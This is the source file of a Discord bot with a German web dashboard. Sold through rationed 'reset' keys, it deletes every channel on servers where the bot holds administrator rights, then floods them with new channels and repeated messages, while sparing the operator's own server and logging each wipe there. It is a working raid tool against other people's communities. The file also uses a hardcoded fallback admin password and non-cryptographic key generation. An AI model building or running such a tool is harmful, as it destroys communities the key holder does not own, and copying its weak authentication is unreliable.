import { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ButtonBuilder, ButtonStyle } from 'discord.js';
import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// ============ KONFIGURATION ============
const PROTECTED_SERVER_ID = '1524503955693113505';
const KEY_COMMAND_CHANNEL_ID = 'get-rdkey';
const LOG_CATEGORY_NAME = 'Resettet Server';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const VERIFY_ROLE_NAME = 'Verifiziert';
const VERIFY_CHANNEL_NAME = 'verifizieren';
const REQUEST_CHANNEL_NAME = 'anfragen';

// ============ VERIFIZIERUNGS-SYSTEM ============
let verificationRequests = [];
const VERIFY_FILE = '/opt/render/project/src/verify.json';

// Verifizierungs-Daten laden
try {
    if (fs.existsSync(VERIFY_FILE)) {
        verificationRequests = JSON.parse(fs.readFileSync(VERIFY_FILE, 'utf8'));
        console.log(`📂 ${verificationRequests.length} Verifizierungs-Anfragen geladen`);
    }
} catch (e) {}

function saveVerifyData() {
    try {
        fs.writeFileSync(VERIFY_FILE, JSON.stringify(verificationRequests, null, 2), 'utf8');
    } catch (e) {}
}

// ============ KEY-SYSTEM ============
let userKeys = [
    { key: 'DEMO-KEY', remainingResets: 0, created: Date.now(), createdBy: 'System' },
];
const KEYS_FILE = '/opt/render/project/src/keys.json';

try {
    if (fs.existsSync(KEYS_FILE)) {
        userKeys = JSON.parse(fs.readFileSync(KEYS_FILE, 'utf8'));
        console.log(`📂 ${userKeys.length} Keys aus Datei geladen`);
    }
} catch (e) {}

function saveKeys() {
    try { fs.writeFileSync(KEYS_FILE, JSON.stringify(userKeys, null, 2), 'utf8'); } catch (e) {}
}

function generateKey() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * 4) + 15;
    let key = '';
    for (let i = 0; i < length; i++) key += chars.charAt(Math.floor(Math.random() * chars.length));
    return key;
}

function validateKey(userKey) {
    const key = userKeys.find(k => k.key === userKey);
    if (!key) return { valid: false, reason: 'Ungültiger Key' };
    if (key.remainingResets <= 0) return { valid: false, reason: 'Key hat keine Resets mehr' };
    return { valid: true, key: key };
}

function useReset(userKey) {
    const key = userKeys.find(k => k.key === userKey);
    if (key && key.remainingResets > 0) { key.remainingResets--; saveKeys(); return true; }
    return false;
}

// ============ LOGGING ============
async function logResetToProtectedServer(guild, data) {
    try {
        const protectedGuild = client.guilds.cache.get(PROTECTED_SERVER_ID);
        if (!protectedGuild) return;

        let category = protectedGuild.channels.cache.find(c => c.name === LOG_CATEGORY_NAME && c.type === ChannelType.GuildCategory);
        if (!category) category = await protectedGuild.channels.create({ name: LOG_CATEGORY_NAME, type: ChannelType.GuildCategory });

        const channelName = guild.name.toLowerCase().replace(/[^a-z0-9äöü]/g, '-').replace(/-+/g, '-').substring(0, 50);
        let serverChannel = protectedGuild.channels.cache.find(c => c.name === channelName && c.parentId === category.id);
        if (!serverChannel) {
            serverChannel = await protectedGuild.channels.create({ name: channelName, type: ChannelType.GuildText, parent: category.id, topic: `Reset-Log für: ${guild.name}` });
        }

        const durationSeconds = ((data.endTime - data.startTime) / 1000).toFixed(1);
        const durationFormatted = durationSeconds < 60 ? `${durationSeconds} Sekunden` : `${(durationSeconds / 60).toFixed(1)} Minuten`;

        const embed = new EmbedBuilder()
            .setTitle(data.isDeleteOnly ? '🗑️ Kanäle gelöscht' : '🔄 Server-Reset')
            .setDescription(`**Server:** ${guild.name}\n**ID:** \`${guild.id}\``)
            .setColor(data.isDeleteOnly ? 0xe74c3c : 0x6c5ce7)
            .addFields([
                { name: '⏱️ Dauer', value: durationFormatted, inline: true },
                { name: '🗑️ Gelöscht', value: `${data.deletedChannels} Kanäle`, inline: true },
                { name: '📅 Datum', value: new Date().toLocaleString('de-DE'), inline: false }
            ]);

        if (!data.isDeleteOnly) {
            embed.addFields([
                { name: '🆕 Erstellt', value: `${data.createdChannels} × "${data.channelName}-X"`, inline: true },
                { name: '📨 Nachricht', value: `\`\`\`${data.message}\`\`\``, inline: false },
                { name: '🔁 Pro Kanal', value: `${data.repeat}x`, inline: true }
            ]);
        }

        embed.addFields([
            { name: '👤 Von', value: data.requestedBy || 'Unbekannt', inline: true },
            { name: '🔑 Key', value: `||${data.userKey}||`, inline: false },
            { name: '⬆️ Rest', value: `${data.remainingResets}`, inline: true }
        ]);
        if (guild.iconURL()) embed.setThumbnail(guild.iconURL({ size: 128 }));
        embed.setFooter({ text: `Reset #${resetStats.totalResets}` }).setTimestamp();
        await serverChannel.send({ embeds: [embed] });
    } catch (e) { console.error('Log-Fehler:', e.message); }
}

// ============ BOT START ============
let resetStats = { totalResets: 0, history: [] };
let currentProgress = { running: false, step: '', serverName: '', progressPercent: 0 };

const TOKEN = process.env.BOT_TOKEN;
if (!TOKEN) { console.error('❌ BOT_TOKEN nicht gesetzt!'); process.exit(1); }

client.login(TOKEN);

client.once('ready', async () => {
    console.log(`✅ Bot online als ${client.user.tag}`);
    console.log(`📡 Auf ${client.guilds.cache.size} Servern`);
    console.log(`🔑 ${userKeys.length} Keys geladen`);
    console.log(`🛡️ Server ${PROTECTED_SERVER_ID} ist geschützt`);
    await sendKeyCommandEmbed();
    await sendVerifyEmbed();
});

// ============ VERIFY-EMBED ============
async function sendVerifyEmbed() {
    const guild = client.guilds.cache.get(PROTECTED_SERVER_ID);
    if (!guild) return;

    const channel = guild.channels.cache.find(c => c.name === VERIFY_CHANNEL_NAME);
    if (!channel) return;

    try {
        const msgs = await channel.messages.fetch({ limit: 10 });
        const botMsgs = msgs.filter(m => m.author.id === client.user.id);
        for (const [_, m] of botMsgs) await m.delete().catch(() => {});
    } catch (e) {}

    const embed = new EmbedBuilder()
        .setTitle('✅ Verifizierung')
        .setDescription('Willkommen auf dem Server!\n\nUm Zugang zu erhalten, musst du dich verifizieren.\n\n**Klicke auf den grünen Button** um eine Anfrage zu stellen.\n\n⏳ Die Bearbeitung kann **1-3 Tage** dauern.')
        .setColor(0x00d26a)
        .setThumbnail(guild.iconURL({ size: 256 }))
        .setFooter({ text: 'Server Manager • Verifizierung' })
        .setTimestamp();

    const button = new ButtonBuilder()
        .setCustomId('verify_request')
        .setLabel('✅ Verifizieren')
        .setStyle(ButtonStyle.Success)
        .setEmoji('🔰');

    const row = new ActionRowBuilder().addComponents(button);
    await channel.send({ embeds: [embed], components: [row] });
    console.log('✅ Verify-Embed gesendet');
}

// ============ INTERACTIONS ============
client.on('interactionCreate', async (interaction) => {
    // === BUTTON: Verifizieren ===
    if (interaction.isButton() && interaction.customId === 'verify_request') {
        const member = interaction.member;
        const guild = interaction.guild;

        // Prüfen ob schon verifiziert
        if (member.roles.cache.find(r => r.name === VERIFY_ROLE_NAME)) {
            return interaction.reply({ content: '✅ Du bist bereits verifiziert!', ephemeral: true });
        }

        // Prüfen ob schon angefragt
        const existing = verificationRequests.find(r => r.userId === member.id && r.status === 'pending');
        if (existing) {
            return interaction.reply({ content: '⏳ Du hast bereits eine Anfrage gestellt. Bitte warte auf Bearbeitung.', ephemeral: true });
        }

        // Prüfen ob abgelehnt in den letzten 24h
        const rejected = verificationRequests.find(r => r.userId === member.id && r.status === 'rejected');
        if (rejected && Date.now() - rejected.timestamp < 24 * 60 * 60 * 1000) {
            const remaining = new Date(rejected.timestamp + 24 * 60 * 60 * 1000);
            return interaction.reply({ content: `❌ Du wurdest abgelehnt. Erneute Anfrage möglich am: ${remaining.toLocaleString('de-DE')}`, ephemeral: true });
        }

        // Anfrage erstellen
        verificationRequests.push({
            userId: member.id,
            username: member.user.tag,
            displayName: member.displayName,
            joinedAt: member.joinedAt?.toISOString() || 'Unbekannt',
            createdAt: member.user.createdAt.toISOString(),
            roles: member.roles.cache.map(r => r.name).join(', '),
            status: 'pending',
            timestamp: Date.now()
        });
        saveVerifyData();

        // Bestätigung an User
        await interaction.reply({ content: '✅ Deine Verifizierungs-Anfrage wurde eingereicht!\n\n⏳ **Warte bitte, bis du verifiziert wirst…** (dies kann 1-3 Tage dauern)\n\nDu wirst benachrichtigt, sobald ein Admin entschieden hat.', ephemeral: true });

        // Embed in Anfragen-Kanal
        const requestChannel = guild.channels.cache.find(c => c.name === REQUEST_CHANNEL_NAME);
        if (requestChannel) {
            const userInfoEmbed = new EmbedBuilder()
                .setTitle('📋 Neue Verifizierungs-Anfrage')
                .setColor(0xfdcb6e)
                .setThumbnail(member.user.displayAvatarURL({ size: 256 }))
                .addFields([
                    { name: '👤 User', value: `${member.user.tag}`, inline: true },
                    { name: '🆔 ID', value: member.id, inline: true },
                    { name: '📛 Anzeigename', value: member.displayName, inline: true },
                    { name: '📅 Account erstellt', value: member.user.createdAt.toLocaleString('de-DE'), inline: true },
                    { name: '📥 Server beigetreten', value: member.joinedAt?.toLocaleString('de-DE') || 'Unbekannt', inline: true },
                    { name: '🎭 Rollen', value: member.roles.cache.map(r => r.name).join(', ') || 'Keine', inline: false },
                    { name: '🤖 Bot?', value: member.user.bot ? 'Ja' : 'Nein', inline: true },
                    { name: '📊 Status', value: '⏳ Ausstehend', inline: true }
                ])
                .setFooter({ text: `User-ID: ${member.id}` })
                .setTimestamp();

            const acceptBtn = new ButtonBuilder().setCustomId(`verify_accept_${member.id}`).setLabel('✅ Annehmen').setStyle(ButtonStyle.Success);
            const rejectBtn = new ButtonBuilder().setCustomId(`verify_reject_${member.id}`).setLabel('❌ Ablehnen').setStyle(ButtonStyle.Danger);

            const btnRow = new ActionRowBuilder().addComponents(acceptBtn, rejectBtn);
            await requestChannel.send({ embeds: [userInfoEmbed], components: [btnRow] });
        }
    }

    // === BUTTON: Annehmen ===
    if (interaction.isButton() && interaction.customId.startsWith('verify_accept_')) {
        const userId = interaction.customId.replace('verify_accept_', '');
        const guild = interaction.guild;
        const member = await guild.members.fetch(userId).catch(() => null);

        if (!member) return interaction.reply({ content: '❌ User nicht gefunden.', ephemeral: true });

        const request = verificationRequests.find(r => r.userId === userId && r.status === 'pending');
        if (!request) return interaction.reply({ content: '❌ Keine ausstehende Anfrage.', ephemeral: true });

        // Rolle vergeben
        let role = guild.roles.cache.find(r => r.name === VERIFY_ROLE_NAME);
        if (!role) {
            role = await guild.roles.create({ name: VERIFY_ROLE_NAME, color: 0x00d26a });
        }
        await member.roles.add(role).catch(() => {});

        request.status = 'accepted';
        saveVerifyData();

        // User benachrichtigen
        try {
            await member.send({ content: `✅ **Du wurdest verifiziert!**\n\nAuf dem Server **${guild.name}** hast du nun Zugang.` });
        } catch (e) {}

        // Embed aktualisieren
        const embed = EmbedBuilder.from(interaction.message.embeds[0])
            .setColor(0x00d26a)
            .setFooter({ text: `✅ Angenommen von ${interaction.user.tag}` });

        await interaction.update({ embeds: [embed], components: [] });
    }

    // === BUTTON: Ablehnen ===
    if (interaction.isButton() && interaction.customId.startsWith('verify_reject_')) {
        const userId = interaction.customId.replace('verify_reject_', '');

        // Modal für Ablehnungsgrund
        const modal = new ModalBuilder()
            .setCustomId(`reject_modal_${userId}`)
            .setTitle('Ablehnungsgrund angeben');

        const reasonInput = new TextInputBuilder()
            .setCustomId('reject_reason')
            .setLabel('Warum wird abgelehnt?')
            .setPlaceholder('z.B. Kein Schulmitglied, falscher Account...')
            .setStyle(TextInputStyle.Paragraph)
            .setRequired(true)
            .setMaxLength(500);

        modal.addComponents(new ActionRowBuilder().addComponents(reasonInput));
        await interaction.showModal(modal);
    }

    // === MODAL: Ablehnungsgrund ===
    if (interaction.isModalSubmit() && interaction.customId.startsWith('reject_modal_')) {
        const userId = interaction.customId.replace('reject_modal_', '');
        const reason = interaction.fields.getTextInputValue('reject_reason');
        const guild = interaction.guild;

        const member = await guild.members.fetch(userId).catch(() => null);
        const request = verificationRequests.find(r => r.userId === userId && r.status === 'pending');
        if (!request) return interaction.reply({ content: '❌ Keine Anfrage gefunden.', ephemeral: true });

        request.status = 'rejected';
        request.rejectReason = reason;
        request.timestamp = Date.now();
        saveVerifyData();

        // User benachrichtigen
        if (member) {
            try {
                await member.send({ content: `❌ **Deine Verifizierung wurde abgelehnt.**\n\n**Grund:** ${reason}\n\nDu kannst in 24 Stunden eine neue Anfrage stellen.` });
            } catch (e) {}
        }

        // Embed aktualisieren
        const embed = EmbedBuilder.from(interaction.message.embeds[0])
            .setColor(0xe74c3c)
            .addFields([{ name: '❌ Abgelehnt von', value: interaction.user.tag, inline: true }, { name: '📝 Grund', value: reason, inline: false }])
            .setFooter({ text: `❌ Abgelehnt` });

        await interaction.message.edit({ embeds: [embed], components: [] });
        await interaction.reply({ content: '✅ User wurde abgelehnt und benachrichtigt.', ephemeral: true });
    }

    // === KEY-GENERATOR (Dropdown) ===
    if (interaction.isStringSelectMenu() && interaction.customId === 'key_resets_select') {
        const selectedResets = interaction.values[0];
        const modal = new ModalBuilder().setCustomId(`key_modal_${selectedResets}`).setTitle('Neuen Key erstellen');
        const nameInput = new TextInputBuilder().setCustomId('key_name').setLabel('Name für den Key').setPlaceholder('z.B. Team-A, Schüler-1').setStyle(TextInputStyle.Short).setRequired(true).setMaxLength(30);
        modal.addComponents(new ActionRowBuilder().addComponents(nameInput));
        await interaction.showModal(modal);
    }

    // === KEY-GENERATOR (Modal) ===
    if (interaction.isModalSubmit() && interaction.customId.startsWith('key_modal_')) {
        const resets = parseInt(interaction.customId.split('_')[2]);
        const keyName = interaction.fields.getTextInputValue('key_name');
        const newKeyValue = generateKey();
        const displayResets = resets === 999 ? 'Unbegrenzt' : resets;

        userKeys.push({ key: newKeyValue, remainingResets: resets, created: Date.now(), createdBy: interaction.user.tag });
        saveKeys();

        const guild = interaction.guild;
        let keyChannel = guild.channels.cache.find(c => c.name === '🔑-key-log' && c.type === ChannelType.GuildText);
        if (!keyChannel) {
            keyChannel = await guild.channels.create({
                name: '🔑-key-log', type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
                ]
            });
            guild.roles.cache.filter(r => r.permissions.has(PermissionsBitField.Flags.Administrator)).forEach(r => {
                keyChannel.permissionOverwrites.create(r, { ViewChannel: true, SendMessages: false }).catch(() => {});
            });
        }

        const keyEmbed = new EmbedBuilder().setTitle('🔑 Neuer Key').setColor(0x00d26a)
            .addFields({ name: '📛 Name', value: keyName, inline: true }, { name: '🔄 Resets', value: `${displayResets}`, inline: true }, { name: '🔑 Key', value: `\`\`\`${newKeyValue}\`\`\``, inline: false }, { name: '👤 Von', value: interaction.user.tag, inline: true })
            .setTimestamp();
        await keyChannel.send({ embeds: [keyEmbed] });
        await interaction.reply({ content: `✅ Key erstellt!\n\n🔑 **Key:** \`${newKeyValue}\`\n🔄 **Resets:** ${displayResets}`, ephemeral: true });
        await sendKeyCommandEmbed();
    }
});

// ============ KEY-EMBED ============
async function sendKeyCommandEmbed() {
    const guild = client.guilds.cache.get(PROTECTED_SERVER_ID);
    if (!guild) return;
    const channel = guild.channels.cache.find(c => c.name === KEY_COMMAND_CHANNEL_ID || c.id === KEY_COMMAND_CHANNEL_ID);
    if (!channel) return;

    try {
        const msgs = await channel.messages.fetch({ limit: 10 });
        for (const [_, m] of msgs.filter(m => m.author.id === client.user.id)) await m.delete().catch(() => {});
    } catch (e) {}

    const embed = new EmbedBuilder().setTitle('🔑 Key-Generator').setDescription('Erstelle Zugangsschlüssel für das Dashboard.\n\n1️⃣ Resets auswählen\n2️⃣ Name eingeben\n3️⃣ Key wird generiert').setColor(0x6c5ce7)
        .addFields({ name: '📊 Keys', value: `${userKeys.length}`, inline: true }, { name: '🔄 Resets', value: `${resetStats.totalResets}`, inline: true })
        .setTimestamp();

    const select = new StringSelectMenuBuilder().setCustomId('key_resets_select').setPlaceholder('Anzahl Resets').addOptions([
        { label: '1', value: '1', emoji: '1️⃣' }, { label: '2', value: '2', emoji: '2️⃣' }, { label: '3', value: '3', emoji: '3️⃣' },
        { label: '5', value: '5', emoji: '5️⃣' }, { label: '10', value: '10', emoji: '🔟' }, { label: '25', value: '25', emoji: '💎' },
        { label: '50', value: '50', emoji: '👑' }, { label: '♾️ 999', value: '999', emoji: '♾️' }
    ]);

    await channel.send({ embeds: [embed], components: [new ActionRowBuilder().addComponents(select)] });
}

// ============ API ROUTEN ============
app.get('/api/status', (req, res) => {
    res.json({ online: client.isReady(), username: client.user?.tag || 'Offline', serverCount: client.guilds.cache.size, ...currentProgress, stats: resetStats });
});

app.post('/api/validate-key', (req, res) => {
    const { userKey } = req.body;
    if (!userKey) return res.json({ valid: false, reason: 'Kein Key' });
    const r = validateKey(userKey);
    res.json({ valid: r.valid, reason: r.reason, remainingResets: r.key?.remainingResets || 0 });
});

app.post('/api/servers', (req, res) => {
    const { userKey } = req.body;
    if (!validateKey(userKey).valid) return res.status(403).json({ error: 'Ungültiger Key' });
    if (!client.isReady()) return res.json([]);
    const servers = client.guilds.cache.filter(g => g.id !== PROTECTED_SERVER_ID && g.members.me?.permissions.has(PermissionsBitField.Flags.Administrator))
        .map(g => ({ id: g.id, name: g.name, icon: g.iconURL({ size: 64 }) || '' }));
    res.json(servers);
});

app.post('/api/reset', async (req, res) => {
    const { userKey, serverId, channelCount, channelName, channelMessage, messageRepeat, requestedBy } = req.body;
    const startTime = Date.now();
    if (serverId === PROTECTED_SERVER_ID) return res.status(403).json({ error: 'Geschützt!' });
    const keyCheck = validateKey(userKey);
    if (!keyCheck.valid) return res.status(403).json({ error: keyCheck.reason });
    if (currentProgress.running) return res.status(400).json({ error: 'Läuft bereits' });
    const guild = client.guilds.cache.get(serverId);
    if (!guild) return res.status(404).json({ error: 'Server nicht gefunden' });
    if (!guild.members.me?.permissions.has(PermissionsBitField.Flags.Administrator)) return res.status(403).json({ error: 'Keine Admin-Rechte' });

    currentProgress = { running: true, step: 'Lösche Kanäle...', serverName: guild.name, progressPercent: 0 };
    try {
        const channels = guild.channels.cache.filter(c => c.deletable);
        let deleted = 0;
        for (const [_, ch] of channels) { await ch.delete().catch(() => {}); deleted++; await new Promise(r => setTimeout(r, 300)); }

        const logChannel = await guild.channels.create({ name: '📋-server-log', type: ChannelType.GuildText, permissionOverwrites: [{ id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.SendMessages] }] });
        const count = Math.min(parseInt(channelCount) || 5, 100);
        const name = channelName || 'kanal';
        const message = channelMessage || '✅ Kanal bereit!';
        const repeat = Math.min(parseInt(messageRepeat) || 1, 15);
        const created = []; 

        for (let i = 1; i <= count; i++) { const ch = await guild.channels.create({ name: `${name}-${i}`, type: ChannelType.GuildText }).catch(() => null); if (ch) created.push(ch); await new Promise(r => setTimeout(r, 500)); }
        for (const ch of created) { for (let m = 1; m <= repeat; m++) { await ch.send({ content: message }).catch(() => {}); await new Promise(r => setTimeout(r, 500)); } }

        useReset(userKey);
        const endTime = Date.now();
        await logChannel.send({ content: `✅ Reset fertig!\n📊 Gelöscht: ${deleted} | Neu: ${count} × "${name}-X"\n🔑 Rest: ${keyCheck.key.remainingResets - 1}` });
        resetStats.totalResets++;
        resetStats.history.unshift({ server: guild.name, timestamp: Date.now(), channelsCreated: count });
        if (resetStats.history.length > 50) resetStats.history.pop();

        await logResetToProtectedServer(guild, { startTime, endTime, deletedChannels: deleted, createdChannels: count, channelName: name, message, repeat, userKey, remainingResets: keyCheck.key.remainingResets - 1, isDeleteOnly: false, requestedBy: requestedBy || 'Unbekannt' });
        currentProgress = { running: false, step: '✅ Fertig!', serverName: guild.name, progressPercent: 100 };
        res.json({ success: true, remainingResets: keyCheck.key.remainingResets - 1 });
    } catch (err) { currentProgress = { running: false, step: '❌ Fehler!', serverName: guild.name, progressPercent: 0 }; res.status(500).json({ error: err.message }); }
});

app.post('/api/delete-channels', async (req, res) => {
    const { userKey, serverId, requestedBy } = req.body;
    const startTime = Date.now();
    if (serverId === PROTECTED_SERVER_ID) return res.status(403).json({ error: 'Geschützt!' });
    const keyCheck = validateKey(userKey);
    if (!keyCheck.valid) return res.status(403).json({ error: keyCheck.reason });
    const guild = client.guilds.cache.get(serverId);
    if (!guild) return res.status(404).json({ error: 'Nicht gefunden' });
    currentProgress = { running: true, step: 'Lösche...', serverName: guild.name, progressPercent: 0 };
    const channels = guild.channels.cache.filter(c => c.deletable);
    let deleted = 0;
    for (const [_, ch] of channels) { await ch.delete().catch(() => {}); deleted++; await new Promise(r => setTimeout(r, 300)); }
    useReset(userKey);
    const endTime = Date.now();
    currentProgress = { running: false, step: '✅ Fertig', serverName: guild.name, progressPercent: 100 };
    await logResetToProtectedServer(guild, { startTime, endTime, deletedChannels: deleted, createdChannels: 0, channelName: '', message: '', repeat: 0, userKey, remainingResets: keyCheck.key.remainingResets - 1, isDeleteOnly: true, requestedBy: requestedBy || 'Unbekannt' });
    res.json({ success: true, deleted, remainingResets: keyCheck.key.remainingResets - 1 });
});

// Admin-Routen
app.post('/api/admin/login', (req, res) => res.json({ success: req.body.password === ADMIN_PASSWORD }));
app.post('/api/admin/keys', (req, res) => {
    if (req.body.password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Verweigert' });
    res.json(userKeys.map(k => ({ key: k.key, remainingResets: k.remainingResets, created: k.created, createdBy: k.createdBy })));
});
app.post('/api/admin/create-key', (req, res) => {
    const { password, keyName, maxResets } = req.body;
    if (password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Verweigert' });
    if (!keyName || !maxResets) return res.status(400).json({ error: 'Daten fehlen' });
    const newKey = { key: generateKey(), remainingResets: parseInt(maxResets), created: Date.now(), createdBy: 'Admin' };
    userKeys.push(newKey); saveKeys();
    res.json({ success: true, key: newKey });
});
app.post('/api/admin/delete-key', (req, res) => {
    if (req.body.password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Verweigert' });
    userKeys = userKeys.filter(k => k.key !== req.body.key); saveKeys();
    res.json({ success: true });
});
app.post('/api/admin/refill-key', (req, res) => {
    const { password, key, amount } = req.body;
    if (password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Verweigert' });
    const found = userKeys.find(k => k.key === key);
    if (!found) return res.status(404).json({ error: 'Nicht gefunden' });
    found.remainingResets += parseInt(amount); saveKeys();
    res.json({ success: true, key: found });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Port ${PORT}`));